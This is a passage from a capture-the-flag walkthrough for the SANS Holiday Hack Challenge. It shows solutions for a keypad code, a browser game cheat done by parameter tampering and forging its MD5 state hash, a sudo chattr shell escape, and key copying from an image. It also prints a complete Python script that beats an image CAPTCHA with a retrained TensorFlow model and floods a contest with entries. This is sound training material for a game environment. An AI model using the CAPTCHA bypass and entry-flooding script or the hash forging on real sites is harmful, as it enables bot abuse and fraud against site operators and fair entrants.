+<p>According to Tangle, the wear on the keypad makes it pretty obvious which digits are used: 1, 3 and 7.  He also says that one digit is repeated once, so the code must be 4 digits long.  </p>
+<p>Precalculated prime numbers are available for download on the Internet.  With a little bit of command line magic, you can identify all of the 4 digit prime numbers that contain 1, 3, or 7, with at least one repeated digit.</p>
+<div class="codehilite"><pre><span></span>$ wget https://primes.utm.edu/lists/small/millions/primes1.zip
+$ unzip primes1.zip
+$ sed -E &#39;s/\s+/\n/g&#39; primes1.txt | grep -E &#39;^[137]{4}$&#39; | grep -E &#39;(.)\1{1}&#39;
+1117
+1171
+1733
+1777
+3313
+3331
+3371
+3373
+3733
+7177
+7331
+7333
+7717
+</pre></div>
+
+
+<p>The only numbers that fit all three clues end up being: 1773, 3371, and 7331.</p>
+<p>Door codes are submitted to a URL as GET parameters.  You can either try them manually or automate the tests through Burpsuite or OWASP Zed Attack Proxy.</p>
+<div class="codehilite"><pre><span></span>$ curl &#39;https://keypad.elfu.org/checkpass.php?i=7331&amp;resourceId=456004db-e880-49ec-a278-f24056f89f49&#39;
+{&quot;success&quot;:true,&quot;resourceId&quot;:&quot;456004db-e880-49ec-a278-f24056f89f49&quot;,&quot;hash&quot;:&quot;31a897165cb11fc5754d547bce7cc2804b161c9ae0b18d3035f449c6cf689880&quot;,&quot;message&quot;:&quot;Valid  Code!&quot;}
+</pre></div>
+
+
+<p>The correct number ends up being 7331.  Since 1337 (leet) isn't prime, the reverse must be the next best thing.</p>
+<h3 id="talk-to-tangle-coalbox-again">Talk to Tangle Coalbox again</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf12.png">Yep, that's it. Thanks for the assist, gumshoe.</p>
+<p>Hey, if you think you can help with another problem, Prof. Banas could use a hand too.</p>
+<p>Head west to the other side of the quad into Hermey Hall and find him in the Laboratory.</p>
+</div>
+<p>Been there, done that.  Move on to the dorm through the open door.</p>
+<h3 id="talk-to-minty-candycane">Talk to Minty Candycane</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/mintycandycane.png">
+Hi! I'm Minty Candycane!</p>
+<p>I just LOVE this old game!</p>
+<p>I found it on a 5 1/4" floppy in the attic.</p>
+<p>You should give it a go!</p>
+<p>If you get stuck at all, check out this year's talks.</p>
+<p>One is about web application penetration testing.</p>
+<p>Good luck, and don't get dysentery!</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The reference to dysentery comes from a time honored game from the days of 8-bit computing called The Oregon Trail.  In Oregon Trail, there are many ways to die that people don't have to worry about today.  "You've Died of Dysentery" was a such a frequent end to the game, it's become a part of the common lexicon for old school gamers.</p>
+<p><center><img alt="On the Oregon Trail, no one dies of old age" src="img/trail-oldage-meme.png" /></center></p>
+</div>
+<p>This game has been re-made from The Oregon Trail into The Holiday Hack Trail, but playing it is very similar.  To win the game, you have to travel to the North Pole (Distance = 8000) by Dec-25 using your limited resources.  You can cheat your way to victory, but each level (Easy, Medium, and Hard) takes a different method.</p>
+<p>In easy mode, start by buying any amount of resources that you can afford (or nothing at all), then update the distance value of 7999 in the GET parameters and press the "&gt;" button.  Now press the Go button.  The game will be over and you'll have successfully reached the North Pole.</p>
+<p><img alt="" src="img/trail-cheat-easy.png" /></p>
+<p>In medium mode, the distance parameter is submitted in a POST request, so you can't just modify the value in the browser bar.  This time, open your browser's web developer tools and search for the distance parameter under the elements tab.  Change the distance parameter's value to 7999.  Now click Go in the game.  The game will be over, and you'll have won again.</p>
+<p><img alt="" src="img/trail-cheat-medium.png" /></p>
+<p>In hard mode, the distance parameter is submitted in a POST request, just like before; however, there is also a hash value that validates some of the game state parameters and makes it harder to cheat.</p>
+<p>If you watch Chris Elgee's YouTube talk about web application testing, you may glimpse part of the code that creates this hash.  With this you can calculate your own hash for any arbitrary set of game state values.</p>
+<p><img alt="" src="img/trail-hash-calc.png" /></p>
+<p>Assuming you start the game without buying anything in the store, the values for Money + Distance + Day + Month + Reindeer + Runners + Ammo + Meds + Food add up to 1626.  The md5 hash of 1626 is bc573864331a9e42e4511de6f678aa83.</p>
+<div class="codehilite"><pre><span></span>$ bc &lt;&lt;&lt; &#39;1500 + 0 + 1 + 9 + 2 + 2 + 10 + 2 + 100&#39;
+1626
+$ echo -n 1626 | md5sum
+bc573864331a9e42e4511de6f678aa83  -
+</pre></div>
+
+
+<p>To win hard mode, start the game in the same way as the previous two modes.  Use web browser developer tools to update the distance parameter to 7999.  Now you need to calculate a new hash so that it will validate your new game state values.  </p>
+<div class="codehilite"><pre><span></span>$ bc &lt;&lt;&lt; &#39;1500 + 0 + 1 + 9 + 2 + 2 + 10 + 2 + 100 + 7999&#39;
+9625
+$ echo -n 9625 | md5sum
+c50ca47bfdb28b8cbf1a59cc68396656  -
+</pre></div>
+
+
+<p>Update the hash parameter to c50ca47bfdb28b8cbf1a59cc68396656, then press the Go button in the game.</p>
+<p>You win!</p>
+<h3 id="get-hint-from-minty-candycane">Get hint from Minty Candycane</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/mintycandycane.png">
+You made it - congrats!</p>
+<p>Have you played with the key grinder in my room? Check it out!</p>
+<p>It turns out: if you have a good image of a key, you can physically copy it.</p>
+<p>Maybe you'll see someone hopping around with a key here on campus.</p>
+<p>Sometimes you can find it in the Network tab of the browser console.</p>
+<p>Deviant has a great talk on it at this year's Con.</p>
+<p>He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Easter Egg</p>
+<p>Doctor Who's TARDIS makes an appearance again in this year's Holiday Hack Challenge!</p>
+<p><center><img alt="TARDIS" src="img/easter-egg-tardis.png" /></center></p>
+</div>
+<h3 id="open-the-door-to-the-steam-tunnel">Open the door to the steam tunnel</h3>
+<p>Enter the dorm room, and observe an unusual character who quickly exits and closes the door at the other end of the room.  When you follow him, all you find is a closet with a keyhole on the back wall.  Closer observation of the character reveals he's got a key hanging from his belt.  As Minty said, if you can get a good look at the key, you should be able to duplicate it using a technique discussed in Deviant KringleCon talk.</p>
+<p><img alt="" src="img/krampus-key.png" /></p>
+<p>Download the character's avatar image using your browser developer tools.  Based on the shape of its head, you can tell that it goes to a Schlage lock.  Download Deviant's key bitting template for Schlage and overlay the images in GIMP to determine what the bitting values of the key are.</p>
+<p><center>
+<img alt="" src="img/keybitting-template.png" />
+</center></p>
+<p>Enter the code 122520 into the key cutter and then take that key to the lock in the closet.  When you insert the key into the lock, the back way of the closet opens, giving you access to the steam tunnels.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>More music inspired by <em>Mary Poppins</em> is playing in the steam tunnel.  This time, it's adapted from the song "Chim-Chim-Cheree".</p>
+</div>
+<p>At the end of the end of the Steam Tunnel, the mysterious character now appears with the name "Krampus" over his head.</p>
+<h3 id="talk-to-krampus-to-get-the-answer">Talk to Krampus to get the answer</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/krampus.png" height="200">
+Hello there! I’m Krampus Hollyfeld.<br />
+I maintain the steam tunnels underneath Elf U,<br />
+Keeping all the elves warm and jolly.  </p>
+<p>Though I spend my time in the tunnels and smoke,<br />
+In this whole wide world, there's no happier bloke!  </p>
+<p>Yes, I borrowed Santa’s turtle doves for just a bit.<br />
+Someone left some scraps of paper near that fireplace, which is a big fire hazard.<br />
+I sent the turtle doves to fetch the paper scraps.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Another quote from <em>Mary Poppins</em>, just like the music.</p>
+<p><center>"Though I spends me time in the ashes and smoke<br />
+In this whole wide world there's no happier bloke."</center></p>
+</div>
+<h3 id="get-a-hint-from-krampus">Get a hint from Krampus</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/krampus.png" height="200">
+But, before I can tell you more, I need to know that I can trust you.
+Tell you what – if you can help me beat the <a href="https://fridosleigh.com/">Frido Sleigh</a> contest (Objective 8), then I'll know I can trust you.</p>
+<p>The contest is here on my screen and at fridosleigh.com.
+No purchase necessary, enter as often as you want, so I am!
+They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.</p>
+<p>Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA.
+(That's Completely Automated Public Turing test to tell Elves and Humans Apart.)
+I've already cataloged <a href="https://downloads.elfu.org/capteha_images.tar.gz">12,000 images</a> and decoded the <a href="https://downloads.elfu.org/capteha_api.py">API interface</a>.
+Can you help me bypass the CAPTEHA and submit lots of entries?</p>
+</div>
+<p><strong>Answer: Krampus Hollyfeld</strong></p>
+<h2 id="objective-8-bypass-the-frido-sleigh-capteha">Objective 8 - Bypass the Frido Sleigh CAPTEHA</h2>
+<p><em>Help Krampus beat the Frido Sleigh contest. For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room.  (Difficulty: 4 out of 5)</em></p>
+<h3 id="talk-to-alabaster-snowball">Talk to Alabaster Snowball</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf13.png">
+Welcome to the Speaker UNpreparedness Room!</p>
+<p>My name's Alabaster Snowball and I could use a hand.</p>
+<p>I'm trying to log into this terminal, but something's gone horribly wrong.</p>
+<p>Every time I try to log in, I get accosted with ... a hatted cat and a toaster pastry?</p>
+<p>I thought my shell was Bash, not flying feline.</p>
+<p>When I try to overwrite it with something else, I get permission errors.</p>
+<p>Have you heard any chatter about immutable files? And what is sudo -l telling me?</p>
+</div>
+<h3 id="terminal-escape-the-nyanshell">Terminal: Escape the nyanshell</h3>
+<p><img alt="" src="img/terminal-nyancat.png" /></p>
+<p>When you first try to su to Alabaster's account, you're rick-rolled with the nyancat instead of getting a shell prompt.</p>
+<p>At first glance, it looks like you can fix this by overwriting the nsh file with one of your own, since all users have read-write access to the file.  When you try this, you get an error message.  </p>
+<div class="codehilite"><pre><span></span>elf@4c766b0e924e:~$ ls -l /bin/nsh
+-rwxrwxrwx 1 root root 75680 Dec 11 17:40 /bin/nsh
+elf@4c766b0e924e:~$ cp /bin/sh /bin/nsh
+cp: cannot create regular file &#39;/bin/nsh&#39;: Operation not permitted
+</pre></div>
+
+
+<p>Using Alabaster's hints to look at sudo, observe that you can run chattr as root without using a password.  This allows you to change file attributes on the file system. </p>
+<div class="codehilite"><pre><span></span>elf@71bc1045d1b3:~$ sudo -l
+Matching Defaults entries for elf on 71bc1045d1b3:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User elf may run the following commands on 71bc1045d1b3:
+    (root) NOPASSWD: /usr/bin/chattr
+</pre></div>
+
+
+<p>One of the attributes you can set on a file makes it "immutable" or unalterable.  Remove that attribute from the file and try replacing the nsh binary again.</p>
+<div class="codehilite"><pre><span></span>elf@3fdbf205de73:/bin$ sudo chattr -i /bin/nsh
+elf@3fdbf205de73:/bin$ cp /bin/sh /bin/nsh
+elf@3fdbf205de73:/bin$ su alabaster_snowball
+Password: 
+Loading, please wait......
+You did it! Congratulations!
+</pre></div>
+
+
+<h3 id="get-hint-from-alabaster">Get hint from Alabaster</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf13.png">
+Who would do such a thing?? Well, it IS a good looking cat.</p>
+<p>Have you heard about the Frido Sleigh contest?</p>
+<p>There are some serious prizes up for grabs.</p>
+<p>The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter.</p>
+<p>I heard there was a talk at KCII about using machine learning to defeat challenges like this.</p>
+<p>I don't think anything could ever beat an elf though!</p>
+</div>
+<h3 id="win-the-fridosleigh-contest">Win the Fridosleigh contest</h3>
+<p>An outline for carrying out this task is provided in the KringleCon talk <a href="https://www.youtube.com/watch?v=jmVPLwjm_zs">Machine Learning Use Cases for Cybersecurity</a>, by Chris Davis.  Be sure to watch this before getting started.</p>
+<p>Download the tensorflow demonstration code from the KringleCon talk.</p>
+<div class="codehilite"><pre><span></span>$ git clone http://github.com/chrisjd20/img_rec_tf_ml_demo
+</pre></div>
+
+
+<p>Download the capteha images cataloged by Krampus and unpack them into a folder.</p>
+<div class="codehilite"><pre><span></span>$ cd img_rec_tf_ml_demo
+$ wget https://downloads.elfu.org/capteha_images.tar.gz
+$ mkdir capteha_images
+$ tar xzf capteha_images.tar.gz -C capteha_images
+</pre></div>
+
+
+<p>Download the decoded Capteha API that Krampus provided.</p>
+<div class="codehilite"><pre><span></span>$ wget https://downloads.elfu.org/capteha_api.py
+</pre></div>
+
+
+<p>Follow the prerequisites in README.md to ensure python3 and necessary modules are installed</p>
+<div class="codehilite"><pre><span></span>$ sudo apt install python3 python3-pip -y
+$ sudo python3 -m pip install --upgrade pip
+$ sudo python3 -m pip install --upgrade setuptools
+$ sudo python3 -m pip install --upgrade tensorflow==1.15
+$ sudo python3 -m pip install tensorflow_hub
+</pre></div>
+
+
+<p>Retrain tensorflow using the capteha images.</p>
+<div class="codehilite"><pre><span></span>$ python3 retrain.py --image_dir=capteha_images/
+</pre></div>
+
+
+<p>Append the following to the imports in capteha_api.py.</p>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">predict_images_using_trained_model</span> <span class="kn">import</span> <span class="n">load_labels</span><span class="p">,</span> \
+   <span class="n">predict_image</span><span class="p">,</span> <span class="n">load_graph</span><span class="p">,</span> <span class="n">read_tensor_from_image_bytes</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">tensorflow</span> <span class="kn">as</span> <span class="nn">tf</span>
+<span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">queue</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+</pre></div>
+
+
+<p>Comment out the line that sets final_answer in capteha_api.py.</p>
+<div class="codehilite"><pre><span></span><span class="c1">#final_answer = &#39;,&#39;.join( [ img[&#39;uuid&#39;] for img in b64_images ] )</span>
+</pre></div>
+
+
+<p>Write your own image processing and machine learning image prediction code based on the what's provided in predict_images_using_trained_model.py, and insert this into capteha_api.py under <code>MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE</code>.</p>
+<p>The final script should look like this:</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># Fridosleigh.com CAPTEHA API - Made by Krampus Hollyfeld</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">predict_images_using_trained_model</span> <span class="kn">import</span> <span class="n">load_labels</span><span class="p">,</span> <span class="n">predict_image</span><span class="p">,</span> <span class="n">load_graph</span><span class="p">,</span> <span class="n">read_tensor_from_image_bytes</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">tensorflow</span> <span class="kn">as</span> <span class="nn">tf</span>
+<span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">queue</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">yourREALemailAddress</span> <span class="o">=</span> <span class="s2">&quot;me@domain.com&quot;</span>
+
+    <span class="c1"># Creating a session to handle cookies</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://fridosleigh.com/&quot;</span>
+
+    <span class="n">json_resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;{}api/capteha/request&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">b64_images</span> <span class="o">=</span> <span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;images&#39;</span><span class="p">]</span>                    <span class="c1"># A list of dictionaries eaching containing the keys &#39;base64&#39; and &#39;uuid&#39;</span>
+    <span class="n">challenge_image_type</span> <span class="o">=</span> <span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;select_type&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>     <span class="c1"># The Image types the CAPTEHA Challenge is looking for.</span>
+    <span class="n">challenge_image_types</span> <span class="o">=</span> <span class="p">[</span><span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; and &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span> <span class="c1"># cleaning and formatting</span>
+
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+
+    <span class="n">select_type</span> <span class="o">=</span> <span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;select_type&#39;</span><span class="p">]</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="c1"># Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory</span>
+    <span class="n">graph</span> <span class="o">=</span> <span class="n">load_graph</span><span class="p">(</span><span class="s1">&#39;/tmp/retrain_tmp/output_graph.pb&#39;</span><span class="p">)</span>
+    <span class="n">labels</span> <span class="o">=</span> <span class="n">load_labels</span><span class="p">(</span><span class="s2">&quot;/tmp/retrain_tmp/output_labels.txt&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Load up our session</span>
+    <span class="n">input_operation</span> <span class="o">=</span> <span class="n">graph</span><span class="o">.</span><span class="n">get_operation_by_name</span><span class="p">(</span><span class="s2">&quot;import/Placeholder&quot;</span><span class="p">)</span>
+    <span class="n">output_operation</span> <span class="o">=</span> <span class="n">graph</span><span class="o">.</span><span class="n">get_operation_by_name</span><span class="p">(</span><span class="s2">&quot;import/final_result&quot;</span><span class="p">)</span>
+    <span class="n">sess</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">compat</span><span class="o">.</span><span class="n">v1</span><span class="o">.</span><span class="n">Session</span><span class="p">(</span><span class="n">graph</span><span class="o">=</span><span class="n">graph</span><span class="p">)</span>
+
+    <span class="c1"># Can use queues and threading to spead up the processing</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">b64_image</span> <span class="ow">in</span> <span class="n">b64_images</span><span class="p">:</span>
+        <span class="n">img_full_path</span> <span class="o">=</span> <span class="n">b64_image</span><span class="p">[</span><span class="s1">&#39;uuid&#39;</span><span class="p">]</span>
+        <span class="n">img</span> <span class="o">=</span> <span class="n">b64_image</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">]</span>
+        <span class="n">image_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
+
+        <span class="c1"># We don&#39;t want to process too many images at once. 10 threads max</span>
+        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">enumerate</span><span class="p">())</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.0001</span><span class="p">)</span>
+
+        <span class="c1">#predict_image function is expecting png image bytes so we read image as &#39;rb&#39; to get a bytes object</span>
+        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">predict_image</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">sess</span><span class="p">,</span> <span class="n">graph</span><span class="p">,</span> <span class="n">image_bytes</span><span class="p">,</span> <span class="n">img_full_path</span><span class="p">,</span> <span class="n">labels</span><span class="p">,</span> <span class="n">input_operation</span><span class="p">,</span> <span class="n">output_operation</span><span class="p">))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Waiting For Threads to Finish...&#39;</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">q</span><span class="o">.</span><span class="n">qsize</span><span class="p">()</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">b64_images</span><span class="p">):</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.001</span><span class="p">)</span>
+
+    <span class="c1">#getting a list of all threads returned results</span>
+    <span class="n">prediction_results</span> <span class="o">=</span> <span class="p">[</span><span class="n">q</span><span class="o">.</span><span class="n">get</span><span class="p">()</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">q</span><span class="o">.</span><span class="n">qsize</span><span class="p">())]</span>
+
+    <span class="k">for</span> <span class="n">prediction</span> <span class="ow">in</span> <span class="n">prediction_results</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="n">prediction</span><span class="p">))</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">prediction</span><span class="p">[</span><span class="s1">&#39;prediction&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="n">challenge_image_types</span><span class="p">):</span>
+            <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">prediction</span><span class="p">[</span><span class="s1">&#39;img_full_path&#39;</span><span class="p">])</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Match: &quot;</span> <span class="o">+</span> <span class="n">prediction</span><span class="p">[</span><span class="s1">&#39;img_full_path&#39;</span><span class="p">])</span>
+    <span class="n">final_answer</span> <span class="o">=</span> <span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>
+
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    END OF IMAGE PROCESSING CODE</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+
+    <span class="c1"># This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .</span>
+    <span class="c1">#final_answer = &#39;,&#39;.join( [ img[&#39;uuid&#39;] for img in b64_images ] )</span>
+
+    <span class="n">json_resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;{}api/capteha/submit&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;answer&#39;</span><span class="p">:</span><span class="n">final_answer</span><span class="p">})</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">]:</span>
+        <span class="c1"># If it fails just run again. ML might get one wrong occasionally</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;FAILED MACHINE LEARNING GUESS&#39;</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;--------------------</span><span class="se">\n</span><span class="s1">Our ML Guess:</span><span class="se">\n</span><span class="s1">--------------------</span><span class="se">\n</span><span class="s1">{}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">final_answer</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;--------------------</span><span class="se">\n</span><span class="s1">Server Response:</span><span class="se">\n</span><span class="s1">--------------------</span><span class="se">\n</span><span class="s1">{}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]))</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;CAPTEHA Solved!&#39;</span><span class="p">)</span>
+    <span class="c1"># If we get to here, we are successful and can submit a bunch of entries till we win</span>
+    <span class="n">userinfo</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;name&#39;</span><span class="p">:</span><span class="s1">&#39;Krampus Hollyfeld&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;email&#39;</span><span class="p">:</span><span class="n">yourREALemailAddress</span><span class="p">,</span>
+        <span class="s1">&#39;age&#39;</span><span class="p">:</span><span class="mi">180</span><span class="p">,</span>
+        <span class="s1">&#39;about&#39;</span><span class="p">:</span><span class="s2">&quot;Cause they&#39;re so flippin yummy!&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;favorites&#39;</span><span class="p">:</span><span class="s1">&#39;thickmints&#39;</span>
+    <span class="p">}</span>
+    <span class="c1"># If we win the once-per minute drawing, it will tell us we were emailed. </span>
+    <span class="c1"># Should be no more than 200 times before we win. If more, somethings wrong.</span>
+    <span class="n">entry_response</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">entry_count</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">while</span> <span class="n">yourREALemailAddress</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">entry_response</span> <span class="ow">and</span> <span class="n">entry_count</span> <span class="o">&lt;</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Submitting lots of entries until we win the contest! Entry #{}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">entry_count</span><span class="p">))</span>
+        <span class="n">entry_response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;{}api/entry&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">userinfo</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+        <span class="n">entry_count</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">entry_response</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+
+<p>Once the capteha has been solved, the script will submit entries for the contest until it detects one of those entries has won.  You will get an e-mail with a unique code to submit in your badge to complete this objective.</p>
+<div class="codehilite"><pre><span></span>&lt;..output shortened..&gt;
+Submitting lots of entries until we win the contest! Entry #98
+Submitting lots of entries until we win the contest! Entry #99
+Submitting lots of entries until we win the contest! Entry #100
+Submitting lots of entries until we win the contest! Entry #101
+Submitting lots of entries until we win the contest! Entry #102
+{&quot;data&quot;:&quot;&lt;h2 id=\&quot;result_header\&quot;&gt; Entries for email address you@domain.com no longer 
+accepted as our systems show your email was already randomly selected as a winner! Go 
+check your email to get your winning code. Please allow up to 3-5 minutes for the email 
+to arrive in your inbox or check your spam filter settings. &lt;br&gt;&lt;br&gt; Congratulations and 
+Happy Holidays!&lt;/h2&gt;&quot;,&quot;request&quot;:true}
+</pre></div>
+
+
+<p><img alt="Frido Sleigh Contest Winner E-mail" src="img/fridosleigh-winner.png" /></p>
+<h3 id="talk-to-krampus-again">Talk to Krampus again</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/krampus.png" height="200">
+You did it! Thank you so much. I can trust you!</p>
+<p>To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels.</p>
+<p>As for those scraps of paper, I scanned those and put the images on my server.</p>
+<p>I then threw the paper away.</p>
+<p>Unfortunately, I managed to lock out my account on the server.</p>
+<p>Hey! You’ve got some great skills. Would you please hack into my system and retrieve the scans? </p>
+</div>
+<p>A new skill is unlocked - you can now travel through the steam tunnels!  Open badge and click on "Steam Tunnels".  Use this to get to the Dorm for the next objective.</p>
+<p><img alt="Steam Tunnel Map" src="img/steamtunnel-map.png" /></p>
+<h2 id="objective-9-retrieve-scraps-of-paper-from-server">Objective 9 - Retrieve Scraps of Paper from Server</h2>
+<p><em>Gain access to the data on the <a href="https://studentportal.elfu.org/">Student Portal</a> server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.  (Difficulty 4 of 5).</em></p>
+<h3 id="talk-to-pepper-minstix">Talk to Pepper Minstix</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf4.png">
+It's me - Pepper Minstix.
+Normally I'm jollier, but this Graylog has me a bit mystified.
+Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala.
